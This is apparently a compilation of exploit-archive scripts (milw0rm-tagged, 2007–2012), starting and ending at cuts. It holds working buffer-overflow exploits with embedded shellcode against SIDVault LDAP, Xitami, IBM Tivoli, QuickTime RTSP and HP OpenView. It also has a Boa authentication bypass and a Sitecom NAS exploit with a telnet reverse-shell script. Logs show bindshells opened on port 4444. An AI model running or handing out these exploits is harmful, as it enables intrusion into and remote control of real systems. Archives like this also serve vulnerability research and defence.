if __name__ == '__main__':
        try:
                target = sys.argv[1]
		u = sys.argv[2]
		p = sys.argv[3]
        except IndexError:
                print 'Usage: %s <ip address> <user> <pass>' % sys.argv[0]
                sys.exit(-1)
        Fascism(target,u,p)

# milw0rm.com [2007-08-14]
#!/usr/bin/python

"""
Alpha Centauri Software SIDVault LDAP Server remote root exploit (0days)
"""

import sys
import socket

sc  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
sc += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
sc += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
sc += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
sc += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x41\x33\x4b\x4d\x43\x35"
sc += "\x43\x44\x43\x45\x4c\x56\x44\x30\x4c\x46\x48\x56\x4a\x45\x49\x49"
sc += "\x49\x38\x41\x4e\x4d\x4c\x42\x58\x48\x59\x43\x44\x44\x55\x48\x36"
sc += "\x4a\x36\x41\x31\x4e\x35\x48\x46\x43\x35\x49\x58\x41\x4e\x4c\x56"
sc += "\x48\x56\x4a\x55\x42\x45\x41\x55\x48\x35\x49\x48\x41\x4e\x4d\x4c"
sc += "\x42\x48\x42\x4b\x48\x46\x41\x4d\x43\x4e\x4d\x4c\x42\x48\x44\x35"
sc += "\x44\x55\x48\x45\x43\x54\x49\x38\x41\x4e\x42\x4b\x48\x36\x4d\x4c"
sc += "\x42\x38\x43\x39\x4c\x46\x44\x30\x49\x55\x42\x4b\x4f\x43\x4d\x4c"
sc += "\x42\x38\x49\x54\x49\x47\x49\x4f\x42\x4b\x4b\x50\x44\x35\x4a\x46"
sc += "\x4f\x32\x4f\x42\x43\x57\x4a\x46\x4a\x36\x4f\x32\x44\x56\x49\x36"
sc += "\x50\x46\x49\x38\x43\x4e\x44\x45\x43\x35\x49\x58\x41\x4e\x4d\x4c"
sc += "\x42\x48\x5a"

#
# The address we will use is 0xffffe777 (JMP ESP in Ubuntu's linux-gate.so)
#
addr = "\x77\xe7\xff\xff"

theLine = '\x90'*2076 + addr+ '\x90'*(2019-len(sc)) + sc

pkt  = '0\x82\x10/\x02\x01\x01c\x82\x10(\x04\x82\x10\x06dc='
pkt += theLine
pkt += '\n\x01\x02\n\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass0\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 389))
s.send(pkt)
s.close()

# milw0rm.com [2007-08-25]
#!/usr/bin/python
# Xitami Web Server 2.5 (If-Modified-Since) 0day Remote Buffer Overflow Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on: Xitami 2.5c2 / XP SP2 Polish
# Shellcode: Windows Execute Command (calc) <metasploit.com>
# Details:..
#
#     [Module xigui32.exe]
#     If-Modified-Since: Evil, ["A" * 76]\r\n
#     EIP 41414141
#
#     [Module xitami.exe]
#     If-Modified-Since: Evil, ["A" * 104]\r\n
#     EIP 41414141
#
# Product Homepage: http://www.xitami.com/
# Just for fun  ;) 
##

from struct import pack
from time import sleep
from socket import *

host = "192.168.0.1"
port = 80

shellcode = (
"\x6a\x22\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x8d\x6c\xf6"
"\xb2\x83\xeb\xfc\xe2\xf4\x71\x84\xb2\xb2\x8d\x6c\x7d\xf7\xb1\xe7"
"\x8a\xb7\xf5\x6d\x19\x39\xc2\x74\x7d\xed\xad\x6d\x1d\xfb\x06\x58"
"\x7d\xb3\x63\x5d\x36\x2b\x21\xe8\x36\xc6\x8a\xad\x3c\xbf\x8c\xae"
"\x1d\x46\xb6\x38\xd2\xb6\xf8\x89\x7d\xed\xa9\x6d\x1d\xd4\x06\x60"
"\xbd\x39\xd2\x70\xf7\x59\x06\x70\x7d\xb3\x66\xe5\xaa\x96\x89\xaf"
"\xc7\x72\xe9\xe7\xb6\x82\x08\xac\x8e\xbe\x06\x2c\xfa\x39\xfd\x70"
"\x5b\x39\xe5\x64\x1d\xbb\x06\xec\x46\xb2\x8d\x6c\x7d\xda\xb1\x33"
"\xc7\x44\xed\x3a\x7f\x4a\x0e\xac\x8d\xe2\xe5\x9c\x7c\xb6\xd2\x04"
"\x6e\x4c\x07\x62\xa1\x4d\x6a\x0f\x97\xde\xee\x6c\xf6\xb2")

opcode = pack("<L", 0x7CA76981) # jmp esp (shell32.dll / XP SP2 Polish)
jmpcode = "\xeb\x22"            # jmp short +0x22

buf = "A" * 72                  # (76 - 4) xigui32.exe
buf += opcode
buf += jmpcode
buf += "\x90" * 128
buf += shellcode

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: Evil, %s\r\n'
'\r\n') % (host, buf)

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
s.send(header)
sleep(1)
s.close()

print "DONE"

# EoF

# milw0rm.com [2007-09-24]
/*
 * Boa HTTP Basic Authentication Bypass 
 * Vuln: Boa/0.93.15 (with Intersil Extensions)
 *
 * Original Advisory: 
 * http://www.securityfocus.com/archive/1/479434
 * http://www.ikkisoft.com/stuff/SN-2007-02.txt
 *
 *  Luca "ikki" Carettoni
 *  http://www.ikkisoft.com
 */

----

#!/usr/bin/env python
import urllib2

SERVER_IP_ADDRESS = '192.168.0.1'
USERNAME 
= 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
NEW_PASSWORD = 'owned'

auth_handler = urllib2.HTTPBasicAuthHandler()
auth_handler.add_password('LOGIN(default username & password is admin)', 
SERVER_IP_ADDRESS, USERNAME, NEW_PASSWORD);
opener = urllib2.build_opener(auth_handler)
urllib2.install_opener(opener)
res = urllib2.urlopen('http://'+SERVER_IP_ADDRESS+'/home/index.shtml')

# milw0rm.com [2007-10-16]
#!/usr/bin/python
#
# IBM Tivoli Storage Manager Express CAD Service Buffer Overflow (5.3)
# http://www.zerodayinitiative.com/advisories/ZDI-07-054.html
# Tested on windows 2003 server SP0. 
# Coded by Mati Aharoni
# muts.at.offensive-security.com
# http://www.offensive-security.com/0day/dsmcad.py.txt
#
# bt ~ # ./dsmcad.py 192.168.1.107
# [*] IBM Tivoli Storage Manager Express CAD Service Buffer Overflow
# [*] http://www.offensive-security.com
# [*] Connecting to 192.168.1.107
# [*] Sending evil buffer, ph33r
# [*] Check port 4444 for bindshell
#
# bt ~ # nc -v 192.168.1.107 4444
# 192.168.1.107: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.1.107] 4444 (krb524) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# E:\Program Files\Tivoli\TSM\baclient>

import socket
import sys

print "[*] IBM Tivoli Storage Manager Express CAD Service Buffer Overflow"
print "[*] http://www.offensive-security.com"

def usage():
	print "[*] Usage: ./dsmcad.py <host>"
	sys.exit(1)

if len(sys.argv) != 2:
	usage()

buffer="BirdsflyinghighyouknowhowIfeel"
buffer+="SunintheskyyouknowhowIfeel"
buffer+="ReeedsdriftinonbyyouknowhowIfeel"
buffer+="ItsanewdawnItsanewdayItsanewlifeForme"
buffer+="ItsanewdawnItsanewdayItsanewlifeFormeitsanewdawnitsanewdayforme"

buffer+="\x38\x07\xD2\x77"	#77D20738 - FFE4 JMP ESP User32.dll Win2kSp0 EN
buffer+="\x90"*4
buffer+=(
# win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x37\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x71\x41\x32\x41\x41\x32"
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x68\x69\x49\x6c\x31"
"\x7a\x68\x6b\x62\x6d\x49\x78\x4b\x49\x39\x6f\x6b\x4f\x39\x6f\x33"
"\x50\x4e\x6b\x52\x4c\x34\x64\x74\x64\x6e\x6b\x42\x65\x67\x4c\x6c"
"\x4b\x41\x6c\x46\x65\x42\x58\x57\x71\x7a\x4f\x6c\x4b\x50\x4f\x65"
"\x48\x4e\x6b\x71\x4f\x51\x30\x37\x71\x58\x6b\x77\x39\x4e\x6b\x75"
"\x64\x4c\x4b\x53\x31\x5a\x4e\x44\x71\x4b\x70\x6f\x69\x6e\x4c\x6c"
"\x44\x69\x50\x42\x54\x45\x57\x4f\x31\x7a\x6a\x36\x6d\x54\x41\x6b"
"\x72\x78\x6b\x69\x64\x47\x4b\x50\x54\x36\x44\x64\x68\x43\x45\x4a"
"\x45\x6e\x6b\x41\x4f\x56\x44\x65\x51\x48\x6b\x75\x36\x6c\x4b\x64"
"\x4c\x50\x4b\x6e\x6b\x71\x4f\x77\x6c\x34\x41\x48\x6b\x53\x33\x66"
"\x4c\x6e\x6b\x4b\x39\x30\x6c\x36\x44\x65\x4c\x51\x71\x4f\x33\x57"
"\x41\x39\x4b\x71\x74\x4c\x4b\x50\x43\x76\x50\x4e\x6b\x41\x50\x54"
"\x4c\x6e\x6b\x32\x50\x45\x4c\x4c\x6d\x6e\x6b\x47\x30\x36\x68\x73"
"\x6e\x32\x48\x6c\x4e\x30\x4e\x56\x6e\x5a\x4c\x56\x30\x6b\x4f\x4b"
"\x66\x71\x76\x62\x73\x31\x76\x45\x38\x74\x73\x76\x52\x71\x78\x63"
"\x47\x63\x43\x76\x52\x31\x4f\x41\x44\x79\x6f\x4e\x30\x65\x38\x58"
"\x4b\x48\x6d\x4b\x4c\x75\x6b\x72\x70\x6b\x4f\x7a\x76\x71\x4f\x6f"
"\x79\x6d\x35\x51\x76\x6c\x41\x58\x6d\x65\x58\x57\x72\x73\x65\x73"
"\x5a\x44\x42\x49\x6f\x6e\x30\x31\x78\x4e\x39\x64\x49\x6a\x55\x4e"
"\x4d\x53\x67\x79\x6f\x6e\x36\x41\x43\x31\x43\x46\x33\x73\x63\x42"
"\x73\x30\x43\x41\x43\x32\x63\x70\x53\x4b\x4f\x38\x50\x43\x56\x71"
"\x78\x74\x51\x33\x6c\x31\x76\x70\x53\x4e\x69\x5a\x41\x4d\x45\x41"
"\x78\x4c\x64\x35\x4a\x30\x70\x6b\x77\x52\x77\x6b\x4f\x6e\x36\x62"
"\x4a\x34\x50\x72\x71\x76\x35\x69\x6f\x4e\x30\x45\x38\x6e\x44\x4c"
"\x6d\x46\x4e\x4d\x39\x46\x37\x59\x6f\x4b\x66\x30\x53\x62\x75\x49"
"\x6f\x38\x50\x63\x58\x6b\x55\x37\x39\x4e\x66\x71\x59\x41\x47\x6b"
"\x4f\x5a\x76\x70\x50\x51\x44\x31\x44\x70\x55\x6b\x4f\x68\x50\x6e"
"\x73\x71\x78\x59\x77\x70\x79\x5a\x66\x71\x69\x66\x37\x6b\x4f\x6a"
"\x76\x52\x75\x4b\x4f\x5a\x70\x71\x76\x31\x7a\x55\x34\x31\x76\x72"
"\x48\x50\x63\x72\x4d\x6f\x79\x78\x65\x53\x5a\x72\x70\x72\x79\x76"
"\x49\x78\x4c\x4b\x39\x4d\x37\x53\x5a\x32\x64\x6d\x59\x6a\x42\x37"
"\x41\x6b\x70\x4b\x43\x4f\x5a\x49\x6e\x63\x72\x56\x4d\x49\x6e\x30"
"\x42\x64\x6c\x6d\x43\x6c\x4d\x62\x5a\x75\x68\x6c\x6b\x6e\x4b\x6e"
"\x4b\x50\x68\x43\x42\x49\x6e\x6c\x73\x62\x36\x69\x6f\x74\x35\x30"
"\x44\x6b\x4f\x48\x56\x53\x6b\x70\x57\x73\x62\x71\x41\x70\x51\x76"
"\x31\x63\x5a\x57\x71\x42\x71\x66\x31\x72\x75\x71\x41\x49\x6f\x68"
"\x50\x75\x38\x4c\x6d\x79\x49\x74\x45\x5a\x6e\x32\x73\x4b\x4f\x6e"
"\x36\x72\x4a\x6b\x4f\x6b\x4f\x50\x37\x79\x6f\x4e\x30\x6e\x6b\x46"
"\x37\x69\x6c\x4f\x73\x69\x54\x52\x44\x49\x6f\x4b\x66\x43\x62\x6b"
"\x4f\x5a\x70\x51\x78\x7a\x50\x4f\x7a\x76\x64\x31\x4f\x33\x63\x4b"
"\x4f\x48\x56\x49\x6f\x48\x50\x61")
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
print "[*] Connecting to "+sys.argv[1]
expl.connect ( ( sys.argv[1], 1581 ) )
print "[*] Sending evil buffer, ph33r"
expl.send ( 'GET /BACLIENT HTTP/1.0\r\nHost: 192.168.1.1 '+ buffer+'\r\n\r\n')
expl.close()
print "[*] Check port 4444 for bindshell"

# milw0rm.com [2007-10-27]
#!/usr/bin/python
##########################################################################
# http://www.offensive-security.com
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on: Apple QuickTime Player 7.3 / 7.2 IE7,FF /Opera, XP SP2, Vista
# This exploit is completely "Universal" .... It has also been modded to work via url redirection ...  
# Magic RETs work on 7.3,7.2,XPSP2,Vista,IE7,Firefox,Opera....
# re-edited by muts and javaguru1999 to annoy Symantec
# http://www.symantec.com/enterprise/security_response/weblog/2007/11/0day_exploit_for_apple_quickti.html
# there IS NO SPOON!
##########################################################################  
# "With Internet Explorer versions 6 and 7, and the Safari 3 beta,  
# the attack appears to be prevented because standard buffer overflow  
# prevention processes act before any damage can be done, Florio wrote.  
# With Firefox, the QuickTime RTSP response is unmoderated. As a result,  
# the exploit works against Firefox if QuickTime is the default multimedia player,  
# according to Florio."
##########################################################################
# Calling Quicktime via URL kicks in an Extra Exception Handler,  
# of which we have no control over.
# By making the buffer larger than the original exploit, we can overwrite  
# the last exception handler, and regain control over execution.
# This is indeed an evil exploit - muhaha.
##########################################################################
 
from socket import *
 
header = (
'RTSP/1.0 200 OK\r\n'
'CSeq: 1\r\n'
'Date: 0x00 :P\r\n'
'Content-Base: rtsp://0.0.0.0/1.mp3/\r\n'
'Content-Type: %s\r\n' # <-- overflow
'Content-Length: %d\r\n'
'\r\n')
 
body = (
'v=0\r\n'
'o=- 16689332712 1 IN IP4 0.0.0.0\r\n'
's=MPEG-1 or 2 Audio, streamed by the PoC Exploit o.O\r\n'
'i=1.mp3\r\n'
't=0 0\r\n'
'a=tool:ciamciaramcia\r\n'
'a=type:broadcast\r\n'
'a=control:*\r\n'
'a=range:npt=0-213.077\r\n'
'a=x-qt-text-nam:MPEG-1 or 2 Audio, streamed by the PoC Exploit o.O\r\n'
'a=x-qt-text-inf:1.mp3\r\n'
'm=audio 0 RTP/AVP 14\r\n'
'c=IN IP4 0.0.0.0\r\n'
'a=control:track1\r\n'
)
 
# ExitProcess shellcode will kill browser, but keep the shell open
 
shellcode =(# win32_bind -  EXITFUNC=process LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x37\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x42"
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x52\x32\x42\x42\x32\x41"
"\x41\x30\x41\x41\x58\x42\x50\x38\x42\x42\x75\x39\x79\x4b\x4c\x61"
"\x7a\x38\x6b\x50\x4d\x68\x68\x69\x69\x4b\x4f\x4b\x4f\x59\x6f\x53"
"\x50\x4e\x6b\x32\x4c\x44\x64\x35\x74\x6e\x6b\x30\x45\x57\x4c\x4e"
"\x6b\x41\x6c\x64\x45\x51\x68\x46\x61\x4a\x4f\x6c\x4b\x30\x4f\x46"
"\x78\x6c\x4b\x71\x4f\x47\x50\x33\x31\x5a\x4b\x61\x59\x6e\x6b\x50"
"\x34\x4e\x6b\x46\x61\x78\x6e\x50\x31\x69\x50\x4e\x79\x4e\x4c\x4b"
"\x34\x6b\x70\x52\x54\x63\x37\x38\x41\x6a\x6a\x44\x4d\x63\x31\x6b"
"\x72\x68\x6b\x49\x64\x77\x4b\x30\x54\x41\x34\x45\x78\x52\x55\x69"
"\x75\x6e\x6b\x73\x6f\x75\x74\x56\x61\x7a\x4b\x33\x56\x4e\x6b\x36"
"\x6c\x72\x6b\x4c\x4b\x53\x6f\x35\x4c\x77\x71\x38\x6b\x47\x73\x44"
"\x6c\x6e\x6b\x4b\x39\x32\x4c\x35\x74\x77\x6c\x65\x31\x69\x53\x56"
"\x51\x49\x4b\x65\x34\x4e\x6b\x67\x33\x34\x70\x4c\x4b\x77\x30\x74"
"\x4c\x6e\x6b\x64\x30\x47\x6c\x4c\x6d\x6e\x6b\x41\x50\x63\x38\x53"
"\x6e\x70\x68\x4e\x6e\x62\x6e\x56\x6e\x38\x6c\x52\x70\x6b\x4f\x7a"
"\x76\x72\x46\x61\x43\x43\x56\x52\x48\x77\x43\x64\x72\x51\x78\x71"
"\x67\x50\x73\x70\x32\x71\x4f\x31\x44\x4b\x4f\x4a\x70\x75\x38\x78"
"\x4b\x68\x6d\x49\x6c\x75\x6b\x46\x30\x4b\x4f\x79\x46\x53\x6f\x6f"
"\x79\x38\x65\x73\x56\x4c\x41\x58\x6d\x64\x48\x65\x52\x72\x75\x32"
"\x4a\x73\x32\x49\x6f\x4a\x70\x33\x58\x78\x59\x63\x39\x39\x65\x4c"
"\x6d\x72\x77\x6b\x4f\x6e\x36\x50\x53\x52\x73\x51\x43\x70\x53\x33"
"\x63\x71\x53\x63\x63\x61\x53\x33\x63\x4b\x4f\x5a\x70\x73\x56\x51"
"\x78\x37\x61\x41\x4c\x50\x66\x53\x63\x6c\x49\x5a\x41\x5a\x35\x51"
"\x78\x4d\x74\x67\x6a\x30\x70\x4b\x77\x66\x37\x79\x6f\x4b\x66\x41"
"\x7a\x32\x30\x72\x71\x33\x65\x59\x6f\x38\x50\x70\x68\x6f\x54\x6e"
"\x4d\x64\x6e\x38\x69\x32\x77\x4b\x4f\x4e\x36\x51\x43\x41\x45\x39"
"\x6f\x4a\x70\x71\x78\x4a\x45\x71\x59\x6d\x56\x43\x79\x76\x37\x4b"
"\x4f\x39\x46\x52\x70\x72\x74\x46\x34\x31\x45\x4b\x4f\x68\x50\x4e"
"\x73\x43\x58\x6b\x57\x71\x69\x6f\x36\x53\x49\x76\x37\x6b\x4f\x38"
"\x56\x71\x45\x6b\x4f\x48\x50\x35\x36\x70\x6a\x31\x74\x45\x36\x31"
"\x78\x62\x43\x32\x4d\x6f\x79\x7a\x45\x71\x7a\x30\x50\x33\x69\x46"
"\x49\x6a\x6c\x6b\x39\x6a\x47\x73\x5a\x51\x54\x6f\x79\x6d\x32\x30"
"\x31\x59\x50\x38\x73\x4d\x7a\x59\x6e\x43\x72\x36\x4d\x69\x6e\x73"
"\x72\x54\x6c\x6f\x63\x4c\x4d\x72\x5a\x74\x78\x4c\x6b\x6c\x6b\x6e"
"\x4b\x35\x38\x50\x72\x6b\x4e\x4c\x73\x64\x56\x4b\x4f\x43\x45\x32"
"\x64\x79\x6f\x7a\x76\x33\x6b\x32\x77\x62\x72\x63\x61\x33\x61\x30"
"\x51\x30\x6a\x53\x31\x71\x41\x46\x31\x52\x75\x32\x71\x6b\x4f\x4e"
"\x30\x70\x68\x4e\x4d\x7a\x79\x46\x65\x4a\x6e\x72\x73\x69\x6f\x58"
"\x56\x72\x4a\x69\x6f\x69\x6f\x66\x57\x39\x6f\x58\x50\x4c\x4b\x41"
"\x47\x6b\x4c\x6c\x43\x4f\x34\x32\x44\x4b\x4f\x68\x56\x76\x32\x4b"
"\x4f\x4e\x30\x71\x78\x33\x4e\x6a\x78\x49\x72\x43\x43\x61\x43\x4b"
"\x4f\x48\x56\x69\x6f\x6a\x70\x42")
 
tmp = "A" * 987
tmp +="\xeb\x20\x90\x90"  # short jump for 7.2
tmp +="\xeb\x20\x9c\x66"  # 669c20eb | funky magic - pop pop ret for 7.2 / short jump for 7.3
tmp +="\x4e\x28\x86\x66"  # 6686284e | pop pop ret for 7.3
tmp += "\x90" * 92
tmp += shellcode
tmp += "\x41" * int(30000-len(shellcode))    # play with this buffer if you still get exceptions.  
 
header %= (tmp, len(body))
evil = header + body
 
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 554))
s.listen(1)
print "[+] Listening on [RTSP] 554"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(evil)
raw_input("[+] Done, press enter to quit")
c.close()
s.close()

# milw0rm.com [2007-11-26]
#!/usr/bin/python
# HP OpenView Network Node Manager CGI Buffer Overflow
# Tested on NNM Release B.07.50 / Windows 2000 server SP4
# http://www.zerodayinitiative.com/advisories/ZDI-07-071.html
# Coded by Mati Aharoni
# muts|offensive-security|com
# http://www.offensive-security.com/0day/hpnnm.txt
# Notes:
# Vanilla stack based overflow 
# I had no idea how to debug this...I ended up modifying the Openview5.exe binary by hijacking 
# the entry point and injecting Sleep just before exe execution. This gave me enough 
# time to attach a debugger before program termination. If anyone knows how to properly 
# debug this, please tell me about it - there *must* be a better way...
#
# bt tools # ./sploit 192.168.1.105
# [+] Connecting to 192.168.1.105
# [+] Sending Evil Buffer to NNM CGI
# [+] Payload Sent, ph33r.
#
# bt tools # nc -nv 192.168.1.105 4444
# (UNKNOWN) [192.168.1.105] 4444 (krb524) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\Program Files\HP OpenView\www\cgi-bin>

import socket
import os
import sys
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
print "[+] Connecting to "+sys.argv[1]
expl.connect ( ( sys.argv[1], 80 ) )
print "[+] Sending Evil Buffer to NNM CGI\n"
buffer="GET /OvCgi/OpenView5.exe?Context=Snmp&Action="
buffer+="A"*5123
buffer+="\x29\x4c\xe1\x77" # JMP ESP user32.dll Win2kSP4
buffer+="\x90"*32
# EXITFUNC=thread LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
buffer+=("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x48\x5a\x6a\x68"
"\x58\x30\x41\x31\x50\x41\x42\x6b\x41\x41\x78\x32\x41\x42\x32\x42"
"\x41\x30\x42\x41\x41\x58\x38\x41\x42\x50\x75\x6b\x59\x39\x6c\x50"
"\x6a\x78\x6b\x30\x4d\x49\x78\x38\x79\x59\x6f\x4b\x4f\x39\x6f\x71"
"\x70\x6e\x6b\x50\x6c\x67\x54\x67\x54\x4c\x4b\x72\x65\x65\x6c\x4c"
"\x4b\x41\x6c\x36\x65\x42\x58\x46\x61\x4a\x4f\x6c\x4b\x70\x4f\x64"
"\x58\x4c\x4b\x73\x6f\x47\x50\x76\x61\x7a\x4b\x50\x49\x6c\x4b\x55"
"\x64\x4e\x6b\x54\x41\x7a\x4e\x65\x61\x6f\x30\x6d\x49\x6c\x6c\x4e"
"\x64\x4f\x30\x71\x64\x35\x57\x49\x51\x4a\x6a\x56\x6d\x63\x31\x5a"
"\x62\x5a\x4b\x79\x64\x77\x4b\x61\x44\x57\x54\x45\x78\x63\x45\x78"
"\x65\x6c\x4b\x33\x6f\x44\x64\x53\x31\x48\x6b\x41\x76\x4c\x4b\x54"
"\x4c\x30\x4b\x6e\x6b\x43\x6f\x45\x4c\x66\x61\x78\x6b\x66\x63\x76"
"\x4c\x4c\x4b\x6c\x49\x42\x4c\x71\x34\x65\x4c\x50\x61\x48\x43\x50"
"\x31\x6b\x6b\x30\x64\x4c\x4b\x50\x43\x70\x30\x4e\x6b\x31\x50\x64"
"\x4c\x6c\x4b\x74\x30\x47\x6c\x6e\x4d\x6e\x6b\x63\x70\x75\x58\x63"
"\x6e\x62\x48\x4c\x4e\x50\x4e\x74\x4e\x5a\x4c\x50\x50\x4b\x4f\x4b"
"\x66\x30\x66\x30\x53\x33\x56\x73\x58\x66\x53\x30\x32\x75\x38\x70"
"\x77\x53\x43\x54\x72\x33\x6f\x76\x34\x6b\x4f\x6e\x30\x62\x48\x6a"
"\x6b\x38\x6d\x49\x6c\x67\x4b\x50\x50\x4b\x4f\x48\x56\x61\x4f\x6c"
"\x49\x38\x65\x65\x36\x4b\x31\x4a\x4d\x47\x78\x43\x32\x32\x75\x73"
"\x5a\x64\x42\x79\x6f\x38\x50\x75\x38\x7a\x79\x46\x69\x7a\x55\x6c"
"\x6d\x66\x37\x59\x6f\x6e\x36\x76\x33\x30\x53\x30\x53\x50\x53\x51"
"\x43\x42\x63\x70\x53\x51\x53\x53\x63\x4b\x4f\x4e\x30\x33\x56\x62"
"\x48\x54\x51\x53\x6c\x61\x76\x52\x73\x4e\x69\x5a\x41\x6e\x75\x75"
"\x38\x4d\x74\x66\x7a\x34\x30\x6a\x67\x32\x77\x6b\x4f\x79\x46\x51"
"\x7a\x46\x70\x51\x41\x70\x55\x4b\x4f\x38\x50\x53\x58\x4e\x44\x4c"
"\x6d\x66\x4e\x78\x69\x33\x67\x49\x6f\x6e\x36\x50\x53\x31\x45\x6b"
"\x4f\x5a\x70\x75\x38\x4d\x35\x42\x69\x6b\x36\x30\x49\x71\x47\x79"
"\x6f\x59\x46\x56\x30\x50\x54\x70\x54\x30\x55\x79\x6f\x48\x50\x4f"
"\x63\x52\x48\x7a\x47\x70\x79\x59\x56\x54\x39\x51\x47\x59\x6f\x58"
"\x56\x50\x55\x79\x6f\x58\x50\x52\x46\x73\x5a\x61\x74\x63\x56\x33"
"\x58\x65\x33\x52\x4d\x4d\x59\x4b\x55\x33\x5a\x70\x50\x56\x39\x44"
"\x69\x6a\x6c\x4d\x59\x59\x77\x71\x7a\x67\x34\x4c\x49\x7a\x42\x54"
"\x71\x4b\x70\x79\x63\x4c\x6a\x4b\x4e\x52\x62\x64\x6d\x49\x6e\x30"
"\x42\x56\x4c\x4d\x43\x4c\x4d\x72\x5a\x77\x48\x6c\x6b\x4c\x6b\x6c"
"\x6b\x32\x48\x31\x62\x49\x6e\x6f\x43\x77\x66\x6b\x4f\x50\x75\x51"
"\x54\x6b\x4f\x7a\x76\x61\x4b\x72\x77\x66\x32\x70\x51\x36\x31\x33"
"\x61\x53\x5a\x65\x51\x72\x71\x61\x41\x30\x55\x41\x41\x79\x6f\x48"
"\x50\x32\x48\x6c\x6d\x6e\x39\x45\x55\x58\x4e\x61\x43\x69\x6f\x6a"
"\x76\x53\x5a\x39\x6f\x4b\x4f\x46\x57\x69\x6f\x6a\x70\x4e\x6b\x73"
"\x67\x49\x6c\x6d\x53\x49\x54\x70\x64\x6b\x4f\x4b\x66\x61\x42\x6b"
"\x4f\x48\x50\x33\x58\x4a\x4f\x58\x4e\x6d\x30\x35\x30\x33\x63\x4b"
"\x4f\x6b\x66\x79\x6f\x58\x50\x68")
buffer+="\r\n\r\n"

expl.send (buffer)
expl.close()
print "[+] Payload Sent, ph33r."

# milw0rm.com [2007-12-12]
#!/usr/bin/python
#
# Exploit Title: Sitecom MD-253 and MD-254 Network Storage Reverse Shell Exploit
# Date: 09/11/12
# Exploit Author: Mattijs van Ommeren (mattijs _ at _ alcyon _ dot _nl)
# Vendor Homepage: http://www.sitecom.com
# Software Link: http://www.sitecom.com/download/5012/SitecomNas.2.4.17.bin
# Version: 2.4.17 and below
# Tested on: Windows 7 x64 and Backtrack 5 R1
# CVE : N/A
#
# This PoC exploit code demonstrates how several bugs in Sitecom MD-253 and MD-254 Network Storage
# devices can be combined to obtain a root shell.
#
# Firmware versions up to and including 2.4.17 are affected by the following vulnerabilities:
#
# 1. The /cgi-bin/upload CGI used by the firmware update function allows arbitrary file uploads that are:
#     - granted execute permissions 
#     - not removed after uploading if they don't contain valid firmware
#     - stored in a predictable location
# 2. Installer.cgi contains a command injection vulnerability that allows one to run arbitrary commands as
#    root (only a limited character set can be used due to URL-encoding by CGI-handler)
#
# Known Limitations:
#	- Crude heuristics to determine whether a pseudo prompt needs to be echoed to stderr
#
# Vulnerability Details:
#	- http://www.alcyon.nl/advisories/aa-007
#	- http://www.alcyon.nl/advisories/aa-008
#
# Latest version of this exploit:
#   - http://www.alcyon.nl/blog/sitecom-poc-exploit
#

import sys
import os
import socket
import thread
import datetime
from optparse import OptionParser

upload_url = '/cgi-bin/upload'
cmd_inj_url = '/cgi-bin/installer.cgi?SetExecTable&%s'
sh_name = 'revsh'

sh_script = """
#!/bin/sh
mknod /tmp/backpipe p
telnet %s %s 0</tmp/backpipe | /bin/sh -C 1>/tmp/backpipe 2>/tmp/backpipe
# clean up our mess
rm -f /tmp/backpipe
rm -f /tmp/%s
""".rstrip('\r')

headers = """Host: %s\r
User-Agent: Mozilla/5.0 (PwNAS 1.0; rv:1.0)\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-us,en;q=0.5\r
Proxy-Connection: close\r
Referer: http://%s/firmware.htm\r
Cookie: language=en;\r\n"""

class Exploit:

	def stdin_thread(self, sock):
		try:
			fd = sys.stdin.fileno()
			while True:
				data = os.read(fd, 1024)
				if not data:
					break
				while True:
					nleft = len(data)
					nleft -= sock.send(data)
					if nleft == 0:
						break
		except:
			pass
		sock.close()
		self.running = False

	def stdout_thread(self, sock):
		last = datetime.datetime.now()	
		try:
			fd = sys.stdout.fileno()
			while True:
				if (datetime.datetime.now()-last<datetime.timedelta(milliseconds=500)):
